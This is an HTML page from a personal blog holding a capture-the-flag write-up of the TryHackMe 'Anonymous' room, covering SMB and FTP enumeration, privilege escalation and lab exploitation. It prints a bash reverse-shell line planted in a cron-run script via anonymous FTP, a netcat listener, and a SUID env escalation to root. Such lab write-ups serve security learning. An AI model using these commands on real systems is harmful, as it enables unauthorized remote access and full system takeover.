@@ -1,0 +1,672 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<link rel="preconnect" href="https://fonts.gstatic.com">
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display&display=swap" rel="stylesheet"> 
+<link rel="icon" href="/seifallahhomrani1.github.io/assets/images/favicon.ico">
+
+<title>TryHackMe: Anonymous WriteUp | Seif-Allah's Blog</title>
+
+<!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>TryHackMe: Anonymous WriteUp | Seif-Allah’s Blog</title>
+<meta name="generator" content="Jekyll v4.2.0" />
+<meta property="og:title" content="TryHackMe: Anonymous WriteUp" />
+<meta name="author" content="Seif-Allah" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="TryHackMe: WriteUp for the Anonymous room (Level: Medium)" />
+<meta property="og:description" content="TryHackMe: WriteUp for the Anonymous room (Level: Medium)" />
+<meta property="og:site_name" content="Seif-Allah’s Blog" />
+<meta property="og:image" content="/seifallahhomrani1.github.io/assets/images/writeups/thm/anonymous/se.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-10-22T00:00:00+01:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="/seifallahhomrani1.github.io/assets/images/writeups/thm/anonymous/se.png" />
+<meta property="twitter:title" content="TryHackMe: Anonymous WriteUp" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"/seifallahhomrani1.github.io/assets/images/cover.png"},"name":"Seif-Allah"},"image":"/seifallahhomrani1.github.io/assets/images/writeups/thm/anonymous/se.png","url":"/seifallahhomrani1.github.io/THM-Anonymous/","headline":"TryHackMe: Anonymous WriteUp","dateModified":"2020-10-22T00:00:00+01:00","datePublished":"2020-10-22T00:00:00+01:00","mainEntityOfPage":{"@type":"WebPage","@id":"/seifallahhomrani1.github.io/THM-Anonymous/"},"author":{"@type":"Person","name":"Seif-Allah"},"description":"TryHackMe: WriteUp for the Anonymous room (Level: Medium)","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/seifallahhomrani1.github.io/assets/css/prism.css" rel="stylesheet">
+
+<link href="/seifallahhomrani1.github.io/assets/css/theme.css" rel="stylesheet">
+
+<script src="/seifallahhomrani1.github.io/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>Navigation</h3>
+        <li><a href="/seifallahhomrani1.github.io/">Home</a></li>
+        <li><a  href="/seifallahhomrani1.github.io/contact">Contact</a></li>
+        <li><a href="/seifallahhomrani1.github.io/categories#Python">Python</a></li>
+        <li><a href="/seifallahhomrani1.github.io/categories#Java">Java</a></li>
+        <li><a href="/seifallahhomrani1.github.io/categories#CTF-WriteUp">CTF-WriteUp</a></li>
+        <li><a href="/seifallahhomrani1.github.io/categories#Articles">Articles</a></li>
+        <li><a href="/seifallahhomrani1.github.io/categories#Networking">Networking</a></li>    
+        <li><a href="/seifallahhomrani1.github.io/categories#Databases">Databases</a></li>
+        <li><a href="/seifallahhomrani1.github.io/categories#Django">Django</a></li>     
+        <li><a href="/seifallahhomrani1.github.io/categories#Linux">Linux</a></li>     
+    </ul>   
+</nav>
+
+<script src="/seifallahhomrani1.github.io/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Type and enter..."/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/seifallahhomrani1.github.io/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/seifallahhomrani1.github.io/">
+        <img src="/seifallahhomrani1.github.io/assets/images/cover.png" alt="Seif-Allah's Blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">TryHackMe: Anonymous WriteUp</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/87daf283c8d29fa33059e59cf5d183bb?s=250&d=mm&r=x" alt="Seif-Allah">
+            
+        </div>            
+        <div>
+        Written by <a target="_blank" class="text-dark" href="seifallahhomrani1.social">Seif-Allah</a> on 
+        <span class="post-date"><time class="post-date" datetime="2020-10-22">22 Oct 2020</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="/seifallahhomrani1.github.io//assets/images/writeups/thm/anonymous/se.png" alt="TryHackMe: Anonymous WriteUp">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Welcome, Welcome, Welcome and Welcome ! 
+This is a WriteUp for the <a href="https://tryhackme.com/room/anonymous"><em>anonymous</em></a> room.
+I Had a lot of fun solving it and I absolutely recommend it.</p>
+
+<h3 id="enumeration">Enumeration</h3>
+<pre><code>Discovered open port 21/tcp on 10.10.9.178
+Discovered open port 445/tcp on 10.10.9.178
+Discovered open port 139/tcp on 10.10.9.178
+Discovered open port 22/tcp on 10.10.9.178
+</code></pre>
+<p>I couldn’t answer the 4th question using the <em>nmap</em> output, so I started enumerating the <em>ftp</em> server which was allowing the <em>anonymous login</em>, and I found some files inside a directory called <em>scripts</em> :</p>
+<pre><code>-rwxr-xrwx    1 1000     1000          314 Jun 04 19:24 clean.sh
+-rw-rw-r--    1 1000     1000         1505 Oct 22 19:45 removed_files.log
+-rw-r--r--    1 1000     1000           68 May 12 03:50 to_do.txt
+</code></pre>
+<p>The <em>clean.sh</em> script looks like it deletes any files inside the /tmp directory :</p>
+<pre><code class="language-bash">#!/bin/bash
+
+tmp_files=0
+echo $tmp_files
+if [ $tmp_files=0 ]
+then
+        echo "Running cleanup script:  nothing to delete" &gt;&gt; /var/ftp/scripts/removed_files.log
+else
+    for LINE in $tmp_files; do
+        rm -rf /tmp/$LINE &amp;&amp; echo "$(date) | Removed file /tmp/$LINE" &gt;&gt; /var/ftp/scripts/removed_files.log;done
+fi
+</code></pre>
+<p>The <em>removed_files.log</em> file was filled with :</p>
+<pre><code>Running cleanup script:  nothing to delete
+</code></pre>
+<p>The <em>to_do.txt</em> was just telling that he needs to disable the ftp anonymous login.</p>
+
+<p>So after enumerating the <em>ftp</em> server, let’s go back and check the <em>smb</em>; but before that let’s explain what is <em>smb</em>: 
+SMB stands for <em>sever message block</em>. It’s a protocol for sharing resources like files, printers, in general any resource which should be retrievable or made available by the server. It primarily runs on port 445 or port 139 depending on the server . It is actually natively available in windows, so windows users don’t need to configure anything extra as such besides basic setting up. In linux however ,it is a little different. To make it work for linux, you need to install a samba server because linux natively does not use SMB protocol.</p>
+
+<p>First security flaw in the SMB is using default credentials or easily guessable and sometimes no authentication at all. 
+The second flaw is the <em>samba server</em> which is extremely vulnerable.</p>
+
+<p>Ok ,so how do we enumerate when we find that in our nmap scan port 445 is open with samba server on. I only said samba server because linux is predominantly used by enterprises , around 75% to be precise. That being said, the process of enumeration for SMB is the same for both linux and windows with the exception that in linux , you have to check the samba version as well and check if it is vulnerable or not.</p>
+
+<p>I ran <em>nmap -sC -p 139,445 -sV 10.10.192.43</em> to know which Samba version is running; 4.7.6
+After that I ran <em>smbmap</em> to enumerate the Samba server.</p>
+<hr />
+<pre><code class="language-bash">root@kali:~/Documents/thm/anonymous# smbmap -H 10.10.192.43 -R
+[+] Finding open SMB ports....
+[+] Guest SMB session established on 10.10.192.43...
+[+] IP: 10.10.192.43:445        Name: 10.10.192.43                                      
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        print$                                                  NO ACCESS       Printer Drivers
+        .                                                  
+        dr--r--r--                0 Sun May 17 11:11:34 2020    .
+        dr--r--r--                0 Thu May 14 01:59:10 2020    ..
+        fr--r--r--            42663 Tue May 12 00:43:42 2020    corgo2.jpg
+        fr--r--r--           265188 Tue May 12 00:43:42 2020    puppos.jpeg
+        pics                                                    READ ONLY       My SMB Share Directory for Pics
+        .\
+        dr--r--r--                0 Sun May 17 11:11:34 2020    .
+        dr--r--r--                0 Thu May 14 01:59:10 2020    ..
+        -r--r--r--            42663 Tue May 12 00:43:42 2020    corgo2.jpg
+        -r--r--r--           265188 Tue May 12 00:43:42 2020    puppos.jpeg
+        IPC$                                                    NO ACCESS       IPC Service (anonymous server (Samba, Ubuntu))
+</code></pre>
+<hr />
+<p>-H stands for host and -R stands for recursive switch to list all the files. 
+Answering Question 4 : The share on the user’s computer is <strong>Pics</strong>. 
+Now you can actually retrieve the files using smbmap as well, I’ll leave that as an exercise. But what if we wanted a full fledged command prompt like a ftp prompt? That’s very much possible with smbclient. Lets try to do that.</p>
+<hr />
+<pre><code class="language-bash">root@kali:~/Documents/thm/anonymous# smbclient \\\\10.10.192.43\\pics
+Enter WORKGROUP\seifallah's password: 
+Try "help" to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Sun May 17 11:11:34 2020
+  ..                                  D        0  Thu May 14 01:59:10 2020
+  corgo2.jpg                          N    42663  Tue May 12 00:43:42 2020
+  puppos.jpeg                         N   265188  Tue May 12 00:43:42 2020
+
+                20508240 blocks of size 1024. 13306812 blocks available
+</code></pre>
+<hr />
+<p>I used <em>get</em> command to get the images, nothing special about some poppies pics. I used <em>binwalk</em> and <em>strings</em> but I found nothing.</p>
+
+<h3 id="user-flag">User Flag</h3>
+
+<p>So I went back to the ftp server, and took a look again to <em>clean.sh</em> file, and since it’s executable and writable, I used it to make a reverse shell; script from <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentestmonkey</a>.</p>
+
+<hr />
+<pre><code class="language-bash">bash -i &gt;&amp; /dev/tcp/10.4.14.245/1234 0&gt;&amp;1
+</code></pre>
+<hr />
+<p>Then I started my local listener, upload the new file using <em>put</em> command and waited some seconds for the cronjob to be executed.</p>
+
+<hr />
+<pre><code class="language-ftp">ftp&gt; put clean.sh 
+local: clean.sh remote: clean.sh
+200 PORT command successful. Consider using PASV.
+150 Ok to send data.
+226 Transfer complete.
+359 bytes sent in 0.00 secs (4.5649 MB/s)
+</code></pre>
+<hr />
+<p>And boom! we got the reverse shell, easy !</p>
+<hr />
+<pre><code class="language-bash">root@kali:~# nc -nlvp 1234
+listening on [any] 1234 ...
+connect to [10.4.14.245] from (UNKNOWN) [10.10.146.152] 55120
+bash: cannot set terminal process group (1241): Inappropriate ioctl for device
+bash: no job control in this shell
+namelessone@anonymous:~$ 
+</code></pre>
+<hr />
+<p>I found the <em>user.txt</em> file in the powered directory. 
+Now I need some PrivEsc.</p>
+
+<h3 id="privesc">PrivEsc</h3>
+<p>Using the hint : <em>This may require you to do some outside research</em> first thing came into my mind is SUID files</p>
+<hr />
+<pre><code class="language-bash">find / -user root -perm -4000 -exec ls -ldb {} \; 2&gt;/dev/null 
+</code></pre>
+<hr />
+<p>looking at the output, we could use <em>env</em> file. 
+Using <a href="https://gtfobins.github.io/gtfobins/env/#suid">GTFObins</a>, here’s the result :</p>
+<hr />
+<pre><code class="language-bash">namelessone@anonymous:~$ /usr/bin/env /bin/bash -p
+/usr/bin/env /bin/bash -p
+ls
+pics
+user.txt
+whoami
+root
+</code></pre>
+<hr />
+<p>Now easily run this command to get the <em>root.txt</em> file.</p>
+<hr />
+<pre><code class="language-bash">cat /root/root.txt
+</code></pre>
+<hr />
+
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Load Comments</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Share
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=TryHackMe: Anonymous WriteUp&url=/seifallahhomrani1.github.io/THM-Anonymous/" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://facebook.com/sharer.php?u=/seifallahhomrani1.github.io/THM-Anonymous/" onclick="window.open(this.href, 'facebook-share', 'width=550,height=435');return false;">
+                <i class="fab fa-facebook-f"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.linkedin.com/shareArticle?mini=true&url=/seifallahhomrani1.github.io/THM-Anonymous/" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-linkedin-in"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Explore more like this</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/seifallahhomrani1.github.io/categories#CTF-WriteUp">CTF-WriteUp</a>                
+    
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/seifallahhomrani1.github.io/tags#Anonymous">Anonymous</a>               
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/seifallahhomrani1.github.io/tags#CTF">CTF</a>               
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/seifallahhomrani1.github.io/tags#Medium">Medium</a>               
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/seifallahhomrani1.github.io/tags#THM">THM</a>               
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/seifallahhomrani1.github.io/tags#TryHackMe">TryHackMe</a>               
+                    
+    <a class="smoothscroll badge badge-primary text-capitalize" href="/seifallahhomrani1.github.io/tags#WriteUp">WriteUp</a>               
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/seifallahhomrani1.github.io/LOS-goblin/">
+                
+
+                    
+                        <img class="img-thumb" src="/seifallahhomrani1.github.io//assets/images/writeups/los/goblin.png" alt="Lord Of SQLi : goblin Writeup"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/seifallahhomrani1.github.io/LOS-goblin/">Lord Of SQLi : goblin Writeup</a>
+                
+            </h2>
+            <h4 class="card-text">'Lord of SQL Injection', a site where you can learn about SQL injection vulnerabilities while capturing dungeons'</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/87daf283c8d29fa33059e59cf5d183bb?s=250&d=mm&r=x" alt="Seif-Allah">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="seifallahhomrani1.social">Seif-Allah</a></span> 
+                
+                <span class="post-date">05 Jan 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/seifallahhomrani1.github.io/LOS-gremlin/">
+                
+
+                    
+                        <img class="img-thumb" src="/seifallahhomrani1.github.io//assets/images/writeups/los/sql1.png" alt="Lord Of SQLi : gremlin Writeup"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/seifallahhomrani1.github.io/LOS-gremlin/">Lord Of SQLi : gremlin Writeup</a>
+                
+            </h2>
+            <h4 class="card-text">'Lord of SQL Injection', a site where you can learn about SQL injection vulnerabilities while capturing dungeons'</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/87daf283c8d29fa33059e59cf5d183bb?s=250&d=mm&r=x" alt="Seif-Allah">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="seifallahhomrani1.social">Seif-Allah</a></span> 
+                
+                <span class="post-date">03 Jan 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/seifallahhomrani1.github.io/THM-Chill-Hack/">
+                
+
+                    
+                        <img class="img-thumb" src="/seifallahhomrani1.github.io//assets/images/writeups/thm/chillhack/chillhack.png" alt="TryHackMe: Chill Hack WriteUp - PART 1"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/seifallahhomrani1.github.io/THM-Chill-Hack/">TryHackMe: Chill Hack WriteUp - PART 1</a>
+                
+            </h2>
+            <h4 class="card-text">TryHackMe: WriteUp for the Chill Hack room (Level: Medium)</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/87daf283c8d29fa33059e59cf5d183bb?s=250&d=mm&r=x" alt="Seif-Allah">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="seifallahhomrani1.social">Seif-Allah</a></span> 
+                
+                <span class="post-date">18 Dec 2020</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+                
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+
+                <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                    Copyright © 2021 Seif-Allah's Blog 
+                </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">
+                Made with love by    
+                <a target="_blank" href="fb.com/seifallahhomrani1">Seif-Allah</a>
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/seifallahhomrani1.github.io/assets/js/prism.js"></script>
+
+<script src="/seifallahhomrani1.github.io/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
